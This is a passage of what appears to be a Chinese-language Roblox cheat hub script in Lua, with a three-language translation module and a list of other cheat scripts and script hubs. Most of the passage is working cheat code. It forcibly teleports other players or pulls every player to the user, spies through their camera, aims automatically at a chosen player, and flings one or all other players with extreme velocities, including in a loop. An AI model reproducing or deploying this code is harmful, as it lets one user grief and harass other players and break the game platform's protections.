        ["梗合集\n\n播放多款网络热梗音效"] = {en = "Meme collection\n\nPlay various meme sounds", ja = "ミームコレクション\n\n様々なミームサウンド再生"},
        ["Its been so long\n\n播放经典英文歌曲"] = {en = "It's been so long\n\nPlay classic English song", ja = "長い時間\n\nクラシック英語曲再生"},
        ["Baller\n\n播放潮流主题音乐"] = {en = "Baller\n\nPlay trendy music", ja = "バラー\n\nトレンド音楽再生"},
        ["男娘必听\n\n播放专属主题音乐"] = {en = "Must listen for boys\n\nPlay special theme", ja = "男の子必聴\n\nスペシャルテーマ再生"},
        ["螃蟹之舞\n\n播放魔性螃蟹舞音乐"] = {en = "Crab dance\n\nPlay addictive crab dance music", ja = "カニダンス\n\n中毒性カニダンス音楽再生"},
        ["布鲁克林惨案\n\n播放相关主题音效"] = {en = "Brooklyn incident\n\nPlay related theme", ja = "ブルックリン事件\n\n関連テーマ再生"},
        ["航空模拟器音乐\n\n播放模拟飞行背景音乐"] = {en = "Flight sim music\n\nPlay flight background music", ja = "航空シミュレータ音楽\n\n飛行背景音楽再生"},
        
        -- 各大脚本按钮
        ["刘某脚本"] = {en = "Liu's script", ja = "劉スクリプト"},
        ["迪脚本"] = {en = "Di's script", ja = "ディスクリプト"},
        ["Xi脚本"] = {en = "Xi script", ja = "Xiスクリプト"},
        ["殺脚本"] = {en = "Kill script", ja = "キルスクリプト"},
        ["黄某脚本"] = {en = "Huang's script", ja = "黄スクリプト"},
        ["AQ脚本"] = {en = "AQ script", ja = "AQスクリプト"},
        ["BS脚本"] = {en = "BS script", ja = "BSスクリプト"},
        ["叶脚本"] = {en = "Ye's script", ja = "葉スクリプト"},
        ["皮脚本"] = {en = "Pi script", ja = "Piスクリプト"},
        ["落叶脚本"] = {en = "Fallen leaf script", ja = "落葉スクリプト"},
        ["CDID脚本"] = {en = "CDID script", ja = "CDIDスクリプト"},
        ["kanl脚本"] = {en = "kanl script", ja = "kanlスクリプト"},
        ["LG脚本"] = {en = "LG script", ja = "LGスクリプト"},
        ["lSlS脚本"] = {en = "lSlS script", ja = "lSlSスクリプト"},
        ["MP中心"] = {en = "MP center", ja = "MPセンター"},
        ["NOL免费版"] = {en = "NOL free version", ja = "NOL無料版"},
        ["Roblox脚本"] = {en = "Roblox script", ja = "Robloxスクリプト"},
        ["SN中心"] = {en = "SN center", ja = "SNセンター"},
        ["XC脚本中心"] = {en = "XC script center", ja = "XCスクリプトセンター"},
        ["XK脚本中心"] = {en = "XK script center", ja = "XKスクリプトセンター"},
        ["XP脚本（卡密：爱吃78的xp"] = {en = "XP script (Key: love78xp)", ja = "XPスクリプト（キー：love78xp）"},
        ["X脚本"] = {en = "X script", ja = "Xスクリプト"},
        ["yba脚本"] = {en = "yba script", ja = "ybaスクリプト"},
        ["Z脚本"] = {en = "Z script", ja = "Zスクリプト"},
        ["白沫脚本"] = {en = "White foam script", ja = "白泡スクリプト"},
        ["北约中心"] = {en = "NATO center", ja = "NATOセンター"},
        ["辞瞄脚本."] = {en = "Aim script", ja = "エイムスクリプト"},
        ["cw脚本"] = {en = "cw script", ja = "cwスクリプト"},
        ["海战脚本"] = {en = "Naval battle script", ja = "海戦スクリプト"},
        ["达脚本云更新V5"] = {en = "Da script cloud update V5", ja = "Daスクリプトクラウド更新V5"},
        ["导管脚本"] = {en = "Conduit script", ja = "導管スクリプト"},
        ["帝脚本"] = {en = "Emperor script", ja = "帝スクリプト"},
        ["旧黑白脚本"] = {en = "Old black-white script", ja = "旧黒白スクリプト"},
        ["冬凌中心"] = {en = "Winter center", ja = "冬凌センター"},
        ["鹤脚本"] = {en = "Crane script", ja = "鶴スクリプト"},
        ["皇脚本."] = {en = "Royal script", ja = "ロイヤルスクリプト"},
        ["黄脚本"] = {en = "Yellow script", ja = "黄スクリプト"},
        ["挽脚本1.2.2"] = {en = "Wan script 1.2.2", ja = "挽スクリプト1.2.2"},
        ["锻造脚本"] = {en = "Forge script", ja = "鍛造スクリプト"},
        ["SX HUB V2"] = {en = "SX HUB V2", ja = "SX HUB V2"},
        
        -- FE脚本按钮
        ["FE coolkid-酷小孩"] = {en = "FE coolkid-Cool kid", ja = "FE coolkid-かっこいい子供"},
        ["FE 爬行"] = {en = "FE crawl", ja = "FE クロール"},
        ["FE R15动画"] = {en = "FE R15 animation", ja = "FE R15アニメーション"},
        ["FE地精."] = {en = "FE goblin", ja = "FE ゴブリン"},
        ["FE大运"] = {en = "FE big luck", ja = "FE 大運"},
        ["FE方块"] = {en = "FE cube", ja = "FE 立方体"},
        ["FE狒狒狒狒"] = {en = "FE baboon", ja = "FE ヒヒ"},
        ["FE假延迟"] = {en = "FE fake lag", ja = "FE 偽遅延"},
        ["FE燃尽脚本."] = {en = "FE burnout script", ja = "FE 燃え尽きスクリプト"},
        ["FE杀手"] = {en = "FE killer", ja = "FE キラー"},
        ["FE舞蹈（超级多）"] = {en = "FE dance (lots)", ja = "FE ダンス（たくさん）"},
        ["FE变大变小（有些服务器用不了）"] = {en = "FE resize (some servers don't work)", ja = "FE サイズ変更（使えないサーバーあり）"},
        ["FE滚球"] = {en = "FE roll ball", ja = "FE ボール転がし"},
        ["FE拥抱"] = {en = "FE hug", ja = "FE ハグ"},
        ["FEac6音乐播放器（有些服务器用不了）"] = {en = "FE ac6 music player (some servers don't work)", ja = "FE ac6音楽プレイヤー（使えないサーバーあり）"},
        ["FE无头断腿（有些服务器用不了）"] = {en = "FE headless broken legs (some servers don't work)", ja = "FE 頭なし足折れ（使えないサーバーあり）"},
        
        -- DOORS功能按钮
        ["门"] = {en = "Doors", ja = "ドアーズ"},
        ["Poop doors"] = {en = "Poop doors", ja = "うんちドアーズ"},
        ["穿墙(无拉回)"] = {en = "Noclip (no pullback)", ja = "壁抜け（引戻しなし）"},
        ["变身(阿巴怪提供)"] = {en = "Transform (by Aba)", ja = "変身（アバ提供）"},
        ["剪刀"] = {en = "Scissors", ja = "はさみ"},
        ["MS"] = {en = "MS", ja = "MS"},
        ["十字架"] = {en = "Cross", ja = "十字架"},
        ["吸铁石"] = {en = "Magnet", ja = "磁石"},
        ["激光枪"] = {en = "Laser gun", ja = "レーザーガン"},
        ["能量罐（清岩提供）"] = {en = "Energy tank (by Qingyan)", ja = "エネルギー缶（清岩提供）"},
        ["紫色手电筒（在电梯购买东西的时候使用）"] = {en = "Purple flashlight (use when buying in elevator)", ja = "紫懐中電灯（エレベーターで購入時使用）"},
        ["刷怪菜单"] = {en = "Monster spawn menu", ja = "モンスター召喚メニュー"},
        ["DOORS变身脚本"] = {en = "DOORS transform script", ja = "DOORS変身スクリプト"},
        ["耶稣十字架"] = {en = "Jesus cross", ja = "イエスの十字架"},
        ["紫光十字架"] = {en = "Purple cross", ja = "紫の十字架"},
        ["万圣节十字架"] = {en = "Halloween cross", ja = "ハロウィン十字架"},
        ["普通十字架"] = {en = "Normal cross", ja = "普通の十字架"},
        
        -- 继续添加其他翻译...
    },
    initialized = false
}

-- 创建语言标签页
LanguageService.LanguageTab = Window:Tab({
    Title = "语言设置",
    Icon = "globe"
})

-- 初始化函数
function LanguageService:Initialize()
    if self.initialized then return end
    
    -- 语言选择下拉框
    self.LanguageTab:Dropdown({
        Title = "当前语言",
        Values = {"中文", "English", "日本語"},
        Value = self.displayLanguage == "Chinese" and "中文" or 
                self.displayLanguage == "English" and "English" or "日本語",
        Callback = function(selected)
            if selected == "中文" then
                self.displayLanguage = "Chinese"
            elseif selected == "English" then
                self.displayLanguage = "English"
            else -- "日本語"
                self.displayLanguage = "Japanese"
            end
            self:ApplyLanguage()
        end
    })
    
    -- 应用语言按钮
    self.LanguageTab:Button({
        Title = "应用语言设置",
        Callback = function()
            self:ApplyLanguage()
        end
    })
    
    -- 刷新翻译按钮
    self.LanguageTab:Button({
        Title = "刷新界面翻译",
        Callback = function()
            self:TranslateExistingUI()
        end
    })
    
    self.initialized = true
    print("✅ 语言模块初始化完成")
end

-- 翻译文本函数 - 支持多语言
function LanguageService:TranslateText(text)
    if not text or type(text) ~= "string" then 
        return text 
    end
    
    -- 如果当前显示语言是中文，不需要翻译
    if self.displayLanguage == "Chinese" then
        return text
    end
    
    -- 获取对应语言的翻译
    local translation = self.Translations[text]
    if translation then
        if self.displayLanguage == "English" then
            return translation.en or text
        elseif self.displayLanguage == "Japanese" then
            return translation.ja or text
        end
    end
    
    -- 如果没有翻译，返回原文本
    return text
end

-- 获取当前语言的翻译键（用于反向查找）
function LanguageService:GetReverseTranslation(text)
    if not text or type(text) ~= "string" then 
        return text 
    end
    
    -- 遍历所有翻译，查找对应的中文
    for chinese, translations in pairs(self.Translations) do
        if translations.en == text then
            return chinese
        elseif translations.ja == text then
            return chinese
        end
    end
    
    return text
end

-- 应用语言设置
function LanguageService:ApplyLanguage()
    local langName = "中文"
    if self.displayLanguage == "English" then
        langName = "English"
    elseif self.displayLanguage == "Japanese" then
        langName = "日本語"
    end
    
    -- 显示通知
    if WindUI and WindUI.Notify then
        WindUI:Notify({
            Title = "语言设置",
            Content = "已切换到: " .. langName,
            Duration = 3,
            Icon = "globe"
        })
    else
        print("🌐 语言已切换到: " .. langName)
    end
    
    -- 重新翻译界面
    self:TranslateExistingUI()
end

-- 翻译现有UI
function LanguageService:TranslateExistingUI()
    -- 创建翻译函数
    local translateFunction
    
    if self.displayLanguage == "Chinese" then
        -- 当前语言是中文，需要将其他语言翻译回中文
        translateFunction = function(text)
            return self:GetReverseTranslation(text)
        end
    else
        -- 当前语言是其他语言，将中文翻译成目标语言
        translateFunction = function(text)
            return self:TranslateText(text)
        end
    end
    
    -- 翻译核心GUI组件
    self:_TranslateGUIRecursive(game:GetService("CoreGui"), translateFunction)
    
    -- 翻译玩家GUI
    local player = game:GetService("Players").LocalPlayer
    if player and player:FindFirstChild("PlayerGui") then
        self:_TranslateGUIRecursive(player.PlayerGui, translateFunction)
    end
    
    print("✅ 界面翻译完成: " .. self.displayLanguage)
end

-- 私有：递归翻译GUI组件
function LanguageService:_TranslateGUIRecursive(parent, translateFunction)
    if not parent then return end
    
    for _, child in ipairs(parent:GetDescendants()) do
        pcall(function()
            if child:IsA("TextLabel") or child:IsA("TextButton") or child:IsA("TextLabel") then
                local original = child.Text
                if original and original ~= "" then
                    local translated = translateFunction(original)
                    if translated ~= original then
                        child.Text = translated
                    end
                end
            elseif child:IsA("TextBox") then
                -- 翻译占位符文本
                if child.PlaceholderText and child.PlaceholderText ~= "" then
                    local original = child.PlaceholderText
                    local translated = translateFunction(original)
                    if translated ~= original then
                        child.PlaceholderText = translated
                    end
                end
            end
        end)
    end
end

-- 自动翻译新创建的UI
function LanguageService:SetupAutoTranslation()
    -- 监听CoreGui
    game:GetService("CoreGui").DescendantAdded:Connect(function(descendant)
        task.wait(0.1) -- 等待组件初始化
        pcall(function()
            if descendant:IsA("TextLabel") or descendant:IsA("TextButton") then
                local original = descendant.Text
                if original and original ~= "" then
                    local translated = self:TranslateText(original)
                    if translated ~= original then
                        descendant.Text = translated
                    end
                end
            end
        end)
    end)
    
    -- 监听PlayerGui
    local player = game:GetService("Players").LocalPlayer
    if player:FindFirstChild("PlayerGui") then
        player.PlayerGui.DescendantAdded:Connect(function(descendant)
            task.wait(0.1)
            pcall(function()
                if descendant:IsA("TextLabel") or descendant:IsA("TextButton") then
                    local original = descendant.Text
                    if original and original ~= "" then
                        local translated = self:TranslateText(original)
                        if translated ~= original then
                            descendant.Text = translated
                        end
                    end
                end
            end)
        end)
    end
end

-- 导出语言服务供其他模块使用
if not getgenv().LanguageService then
    getgenv().LanguageService = LanguageService
end

-- 初始化语言服务
LanguageService:Initialize()

print("🌐 语言设置模块加载完成 - 支持中文/英文/日语")

local Tab0 = Tab("简介")
-- 自动打开简介标签（核心新增代码）
if Tab0 and Tab0.Select then
    Tab0:Select() -- 调用WindUI的标签选中方法
elseif Window and Window.SelectTab then
    Window:SelectTab(Tab0) -- 兼容不同WindUI版本的选中方式
end

Window:Divider()
local Tab1 = Tab("通用")
local Tab2 = Tab("通用2")
Window:Divider()
local Tab4 = Tab("范围与旋转")
-- 玩家控制相关配置初始化
local PlayerConfig = {
    dropdown = {},
    playernamedied = "",
    LoopTeleport = false,
    LoopTeleportToMe = false,
    LoopTeleportAll = false,
    LookPlayer = false,
    AutoFling = false,
    Aimbot = false,
    FPDH = workspace.FallenPartsDestroyHeight or -1000
}

-- 刷新玩家列表函数
local function shuaxinlb(forceRefresh)
    local Players = game:GetService("Players")
    local tempList = {}
    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= LocalPlayer then
            table.insert(tempList, player.Name)
        end
    end
    PlayerConfig.dropdown = tempList
end

-- 初始化玩家列表
shuaxinlb(true)

-- 通知函数适配（兼容原脚本的Notify机制）
local function Notify(title, content, duration)
    if Notification then
        Notification:Notify(
            {Title = title, Description = content},
            {OutlineColor = Color3.fromRGB(255, 255, 255), Time = duration or 3, Type = "text"}
        )
    else
        warn(string.format("[%s] %s", title, content))
    end
end

-- 发送通知函数（适配甩飞功能）
local function SendNotification(title, content, duration)
    Notify(title, content, duration)
end

-- 玩家交互标签页（使用Tab函数创建，统一脚本风格）
local Tab3 = Tab("玩家交互")

-- 玩家选择下拉框
local dropdownValue = "选择玩家"
local dropdownElement = Tab3:Dropdown({
    Title = "选择玩家名称",
    Desc = "选择要操作的玩家",
    Values = PlayerConfig.dropdown,
    Value = dropdownValue,
    Callback = function(value)
        PlayerConfig.playernamedied = value
        dropdownValue = value
        Notify("黑白脚本", "已选择玩家: " .. value, 3)
    end
})

-- 刷新玩家名按钮
Tab3:Button({
    Title = "刷新玩家名",
    Icon = "refresh-cw",
    Callback = function()
        shuaxinlb(true)
        dropdownElement:SetValues(PlayerConfig.dropdown)
        Notify("黑白脚本", "玩家列表已刷新", 3)
    end
})

-- 传送到玩家旁边
Tab3:Button({
    Title = "传送到玩家旁边",
    Icon = "arrow-right-to-bracket",
    Callback = function()
        if PlayerConfig.playernamedied == "" then
            Notify("黑白脚本", "请先选择玩家", 5)
            return
        end
        
        local localRootPart = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
        local targetPlayer = game.Players:FindFirstChild(PlayerConfig.playernamedied)
        
        if localRootPart and targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
            localRootPart.CFrame = targetPlayer.Character.HumanoidRootPart.CFrame + Vector3.new(0, 3, 0)
            Notify("黑白脚本", "已经传送到玩家身边", 5)
        else
            Notify("黑白脚本", "无法传送 原因: 玩家已消失", 5)
        end
    end
})

-- 循环锁定传送
Tab3:Toggle({
    Title = "循环锁定传送",
    Desc = "持续传送到选定玩家",
    Icon = "repeat",
    Value = PlayerConfig.LoopTeleport,
    Callback = function(enabled)
        PlayerConfig.LoopTeleport = enabled
        
        if enabled then
            Notify("黑白脚本", "已开启循环传送", 5)
            
            spawn(function()
                while PlayerConfig.LoopTeleport do
                    local localRootPart = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
                    local targetPlayer = game.Players:FindFirstChild(PlayerConfig.playernamedied)
                    
                    if localRootPart and targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
                        localRootPart.CFrame = targetPlayer.Character.HumanoidRootPart.CFrame + Vector3.new(0, 3, 0)
                    end
                    wait()
                end
            end)
        else
            Notify("黑白脚本", "已关闭循环传送", 5)
        end
    end
})

-- 把玩家传送过来
Tab3:Button({
    Title = "把玩家传送过来",
    Icon = "arrow-left-to-bracket",
    Callback = function()
        if PlayerConfig.playernamedied == "" then
            Notify("黑白脚本", "请先选择玩家", 5)
            return
        end
        
        local localRootPart = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
        local targetPlayer = game.Players:FindFirstChild(PlayerConfig.playernamedied)
        
        if localRootPart and targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
            targetPlayer.Character.HumanoidRootPart.CFrame = localRootPart.CFrame + Vector3.new(0, 3, 0)
            Notify("黑白脚本", "已将玩家传送过来", 5)
        else
            Notify("黑白脚本", "无法传送 原因: 玩家已消失", 5)
        end
    end
})

-- 循环传送玩家过来
Tab3:Toggle({
    Title = "循环传送玩家过来",
    Desc = "持续将选定玩家传送过来",
    Icon = "repeat",
    Value = PlayerConfig.LoopTeleportToMe,
    Callback = function(enabled)
        PlayerConfig.LoopTeleportToMe = enabled
        
        if enabled then
            Notify("黑白脚本", "已开启循环传送玩家过来", 5)
            
            spawn(function()
                while PlayerConfig.LoopTeleportToMe do
                    local localRootPart = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
                    local targetPlayer = game.Players:FindFirstChild(PlayerConfig.playernamedied)
                    
                    if localRootPart and targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
                        targetPlayer.Character.HumanoidRootPart.CFrame = localRootPart.CFrame + Vector3.new(0, 3, 0)
                    end
                    wait()
                end
            end)
        else
            Notify("黑白脚本", "已关闭循环传送玩家过来", 5)
        end
    end
})

-- 吸全部玩家
Tab3:Toggle({
    Title = "吸全部玩家",
    Desc = "将所有玩家吸到身边",
    Icon = "users",
    Value = PlayerConfig.LoopTeleportAll,
    Callback = function(enabled)
        PlayerConfig.LoopTeleportAll = enabled
        
        if enabled then
            Notify("黑白脚本", "已开启吸全部玩家", 5)
            spawn(function()
                while PlayerConfig.LoopTeleportAll do
                    for _, player in ipairs(game:GetService("Players"):GetPlayers()) do
                        if player.Name ~= LocalPlayer.Name then
                            local localChar = LocalPlayer.Character
                            local targetChar = player.Character
                            
                            if localChar and localChar:FindFirstChild("HumanoidRootPart") and 
                               targetChar and targetChar:FindFirstChild("HumanoidRootPart") then
                                local localPosition = localChar.HumanoidRootPart.Position
                                local lookVector = localChar.HumanoidRootPart.CFrame.lookVector
                                targetChar.HumanoidRootPart.CFrame = CFrame.new(localPosition + lookVector * 3, localPosition + lookVector * 4)
                            end
                            wait()
                        end
                    end
                    wait()
                end
            end)
        else
            Notify("黑白脚本", "已关闭吸全部玩家", 5)
        end
    end
})

-- 查看玩家
Tab3:Toggle({
    Title = "查看玩家",
    Desc = "将视角切换到选定玩家",
    Icon = "eye",
    Value = PlayerConfig.LookPlayer,
    Callback = function(enabled)
        PlayerConfig.LookPlayer = enabled
        
        if enabled then
            if PlayerConfig.playernamedied == "" then
                Notify("黑白脚本", "请先选择玩家", 5)
                return
            end
            
            local targetPlayer = game:GetService("Players"):FindFirstChild(PlayerConfig.playernamedied)
            if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("Humanoid") then
                game:GetService("Workspace").CurrentCamera.CameraSubject = targetPlayer.Character.Humanoid
                Notify("黑白脚本", "已开启查看玩家", 5)
            else
                Notify("黑白脚本", "无法查看玩家", 5)
            end
        else
            if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
                game:GetService("Workspace").CurrentCamera.CameraSubject = LocalPlayer.Character.Humanoid
                Notify("黑白脚本", "已关闭查看玩家", 5)
            end
        end
    end
})

-- 查找玩家函数
local function FindPlayerByName(name)
    name = name:lower()
    local Players = game:GetService("Players")
    local localPlayer = Players.LocalPlayer
    
    if name == "all" or name == "others" then
        return "all"
    end
    
    if name == "random" then
        local allPlayers = Players:GetPlayers()
        local idx = table.find(allPlayers, localPlayer)
        if idx then
            table.remove(allPlayers, idx)
        end
        if #allPlayers > 0 then
            return allPlayers[math.random(#allPlayers)]
        end
        return nil
    end
    
    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= localPlayer then
            if player.Name:lower():match("^" .. name) then
                return player
            end
            if player.DisplayName:lower():match("^" .. name) then
                return player
            end
        end
    end
    return nil
end

-- 甩飞玩家函数
local function ThrowPlayer(targetPlayer)
    local localCharacter = LocalPlayer.Character
    local localHumanoid = localCharacter and localCharacter:FindFirstChildOfClass("Humanoid")
    local localRootPart = localHumanoid and localHumanoid.RootPart
    local targetCharacter = targetPlayer.Character
    
    if not localCharacter or not localHumanoid or not localRootPart or not targetCharacter then
        SendNotification("黑白脚本", "无法甩飞: 角色不存在", 5)
        return
    end
    
    local targetHumanoid = targetCharacter:FindFirstChildOfClass("Humanoid")
    local targetRootPart = targetHumanoid and targetHumanoid.RootPart
    local targetHead = targetCharacter:FindFirstChild("Head")
    local targetAccessory = targetCharacter:FindFirstChildOfClass("Accessory")
    local accessoryHandle = targetAccessory and targetAccessory:FindFirstChild("Handle")
    
    if localRootPart.Velocity.Magnitude < 50 then
        getgenv().OldPos = localRootPart.CFrame
    end
    
    if targetHumanoid and targetHumanoid.Sit then
        SendNotification("黑白脚本", "玩家正在坐下", 5)
        return
    end
    
    if targetHead then
        workspace.CurrentCamera.CameraSubject = targetHead
    elseif not targetHead and accessoryHandle then
        workspace.CurrentCamera.CameraSubject = accessoryHandle
    elseif targetHumanoid and targetRootPart then
        workspace.CurrentCamera.CameraSubject = targetHumanoid
    end
    
    if not targetCharacter:FindFirstChildWhichIsA("BasePart") then
        return
    end
    
    local function ApplyThrowForce(part, offset, rotation)
        localRootPart.CFrame = CFrame.new(part.Position) * offset * rotation
        if localCharacter.PrimaryPart then
            localCharacter:SetPrimaryPartCFrame(CFrame.new(part.Position) * offset * rotation)
        end
        localRootPart.Velocity = Vector3.new(90000000, 900000000, 90000000)
        localRootPart.RotVelocity = Vector3.new(900000000, 900000000, 900000000)
    end
    
    local function PerformThrowAnimation(part)
        local timeoutDuration = 2
        local startTime = tick()
        local rotationAngle = 0
        
        while localRootPart and localRootPart.Parent do
            local velocityMagnitude = part.Velocity.Magnitude
            if velocityMagnitude < 50 then
                rotationAngle = rotationAngle + 100
                ApplyThrowForce(part, CFrame.new(0, 1.5, 0) + (targetHumanoid.MoveDirection or Vector3.new()) * part.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(rotationAngle), 0, 0))
                task.wait()
                ApplyThrowForce(part, CFrame.new(0, -1.5, 0) + (targetHumanoid.MoveDirection or Vector3.new()) * part.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(rotationAngle), 0, 0))
                task.wait()
                ApplyThrowForce(part, CFrame.new(2.25, 1.5, -2.25) + (targetHumanoid.MoveDirection or Vector3.new()) * part.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(rotationAngle), 0, 0))
                task.wait()
                ApplyThrowForce(part, CFrame.new(-2.25, -1.5, 2.25) + (targetHumanoid.MoveDirection or Vector3.new()) * part.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(rotationAngle), 0, 0))
                task.wait()
                ApplyThrowForce(part, CFrame.new(0, 1.5, 0) + (targetHumanoid.MoveDirection or Vector3.new()), CFrame.Angles(math.rad(rotationAngle), 0, 0))
                task.wait()
                ApplyThrowForce(part, CFrame.new(0, -1.5, 0) + (targetHumanoid.MoveDirection or Vector3.new()), CFrame.Angles(math.rad(rotationAngle), 0, 0))
                task.wait()
            else
                ApplyThrowForce(part, CFrame.new(0, 1.5, targetHumanoid.WalkSpeed or 16), CFrame.Angles(math.rad(90), 0, 0))
                task.wait()
                ApplyThrowForce(part, CFrame.new(0, -1.5, -(targetHumanoid.WalkSpeed or 16)), CFrame.Angles(0, 0, 0))
                task.wait()
                ApplyThrowForce(part, CFrame.new(0, 1.5, targetHumanoid.WalkSpeed or 16), CFrame.Angles(math.rad(90), 0, 0))
                task.wait()
                ApplyThrowForce(part, CFrame.new(0, 1.5, targetRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0))
                task.wait()
                ApplyThrowForce(part, CFrame.new(0, -1.5, -targetRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(0, 0, 0))
                task.wait()
                ApplyThrowForce(part, CFrame.new(0, 1.5, targetRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0))
                task.wait()
                ApplyThrowForce(part, CFrame.new(0, -1.5, 0), CFrame.Angles(math.rad(90), 0, 0))
                task.wait()
                ApplyThrowForce(part, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
                task.wait()
                ApplyThrowForce(part, CFrame.new(0, -1.5, 0), CFrame.Angles(math.rad(-90), 0, 0))
                task.wait()
                ApplyThrowForce(part, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
                task.wait()
            end
            
            velocityMagnitude = part.Velocity.Magnitude
            if velocityMagnitude <= 500 then
                if part.Parent == targetPlayer.Character and targetPlayer.Parent == game:GetService("Players") then
                    local hasCharacter = not targetPlayer.Character
                    if hasCharacter ~= targetCharacter then
                        local isSitting = targetHumanoid and targetHumanoid.Sit
                        if not isSitting and localHumanoid.Health > 0 then
                            if tick() > startTime + timeoutDuration then
                                break
                            end
                        else
                            break
                        end
                    else
                        break
                    end
                else
                    break
                end
            else
                break
            end
        end
    end
    
    workspace.FallenPartsDestroyHeight = math.huge
    local bodyVelocity = Instance.new("BodyVelocity")
    bodyVelocity.Name = "EpixVel"
    bodyVelocity.Parent = localRootPart
    bodyVelocity.Velocity = Vector3.new(900000000, 900000000, 900000000)
    bodyVelocity.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
    
    if targetHumanoid then
        targetHumanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
    end
    
    if targetRootPart and targetHead then
        if (targetRootPart.CFrame.Position - targetHead.CFrame.Position).Magnitude > 5 then
            PerformThrowAnimation(targetHead)
        else
            PerformThrowAnimation(targetRootPart)
        end
    elseif targetRootPart then
        PerformThrowAnimation(targetRootPart)
    elseif targetHead then
        PerformThrowAnimation(targetHead)
    elseif targetAccessory and accessoryHandle then
        PerformThrowAnimation(accessoryHandle)
    else
        SendNotification("黑白脚本", "无法甩飞目标", 5)
        return
    end
    
    bodyVelocity:Destroy()
    if targetHumanoid then
        targetHumanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
    end
    workspace.CurrentCamera.CameraSubject = localHumanoid
    
    if getgenv().OldPos then
        repeat
            localRootPart.CFrame = getgenv().OldPos * CFrame.new(0, 0.5, 0)
            if localCharacter.PrimaryPart then
                localCharacter:SetPrimaryPartCFrame(getgenv().OldPos * CFrame.new(0, 0.5, 0))
            end
            if localHumanoid then
                localHumanoid:ChangeState(Enum.HumanoidStateType.GettingUp)
            end
            
            for _, child in ipairs(localCharacter:GetChildren()) do
                if child:IsA("BasePart") then
                    child.RotVelocity = Vector3.new()
                    child.Velocity = Vector3.new()
                end
            end
            task.wait()
        until (localRootPart.Position - getgenv().OldPos.Position).Magnitude < 25
    end
    
    workspace.FallenPartsDestroyHeight = PlayerConfig.FPDH
end

-- 甩飞一次按钮
Tab3:Button({
    Title = "甩飞一次",
    Icon = "target",
    Callback = function()
        if PlayerConfig.playernamedied == "" then
            Notify("黑白脚本", "请先选择玩家", 5)
            return
        end
        
        local targetNames = {PlayerConfig.playernamedied}
        local foundPlayer = FindPlayerByName(targetNames[1])
        
        if foundPlayer == "all" then
            for _, player in ipairs(game:GetService("Players"):GetPlayers()) do
                if player ~= LocalPlayer then
                    ThrowPlayer(player)
                end
            end
            SendNotification("黑白脚本", "正在甩飞所有玩家", 5)
        elseif foundPlayer then
            if foundPlayer.UserId == 1414978355 then
                SendNotification("黑白脚本", "检测到特殊玩家，已停止", 5)
                return
            end
            ThrowPlayer(foundPlayer)
            SendNotification("黑白脚本", "正在甩飞玩家", 5)
        else
            SendNotification("黑白脚本", "未找到玩家", 5)
        end
    end
})

-- 循环甩飞开关
Tab3:Toggle({
    Title = "循环甩飞",
    Desc = "持续甩飞选定玩家",
    Icon = "repeat",
    Value = PlayerConfig.AutoFling,
    Callback = function(enabled)
        PlayerConfig.AutoFling = enabled
        
        if enabled then
            Notify("黑白脚本", "已开启循环甩飞", 5)
            
            spawn(function()
                while PlayerConfig.AutoFling do
                    if PlayerConfig.playernamedied ~= "" then
                        local targetNames = {PlayerConfig.playernamedied}
                        local foundPlayer = FindPlayerByName(targetNames[1])
                        
                        if foundPlayer == "all" then
                            for _, player in ipairs(game:GetService("Players"):GetPlayers()) do
                                if player ~= LocalPlayer then
                                    ThrowPlayer(player)
                                end
                            end
                        elseif foundPlayer then
                            if foundPlayer.UserId ~= 1414978355 then
                                ThrowPlayer(foundPlayer)
                            end
                        end
                    end
                    wait()
                end
            end)
        else
            Notify("黑白脚本", "已关闭循环甩飞", 5)
        end
    end
})

-- 开启瞄准指定目标
Tab3:Toggle({
    Title = "开启瞄准指定目标",
    Desc = "瞄准选定玩家",
    Icon = "crosshair",
    Value = PlayerConfig.Aimbot,
    Callback = function(enabled)
        PlayerConfig.Aimbot = enabled
        local camera = game:GetService("Workspace").CurrentCamera
        
        if enabled then
            if PlayerConfig.playernamedied == "" then
                Notify("黑白脚本", "请先选择玩家", 5)
                PlayerConfig.Aimbot = false
                return
            end
            
            Notify("黑白脚本", "已开启自瞄", 5)
            
            spawn(function()
                while PlayerConfig.Aimbot do
                    local targetPlayer = game.Players:FindFirstChild(PlayerConfig.playernamedied)
                    local targetPart = targetPlayer and targetPlayer.Character and targetPlayer.Character.HumanoidRootPart
                    
                    if targetPart and camera then
                        camera.CFrame = CFrame.new(camera.CFrame.Position, camera.CFrame.Position + (targetPart.Position - camera.CFrame.Position).unit)
                    else
                        break
                    end
                    wait()
                end
            end)
        else
            Notify("黑白脚本", "已关闭自瞄", 5)
        end
    end
})

Window:Divider()
local Tab5 = Tab("音乐")
Window:Divider()
local Tab6 = Tab("各大脚本")
Window:Divider()
local Tab7 = Tab("FE")
Window:Divider()
local Tab8 = Tab("DOORS")
local Tab9 = Tab("rooms&doors")
local Tab10 = Tab("压力,doors")
local Tab11 = Tab("动感星期五")
local Tab12 = Tab("压力")
local Tab13 = Tab("成为乞丐")
local Tab14 = Tab("磁铁模拟器")
local Tab15 = Tab("建造一架飞机")
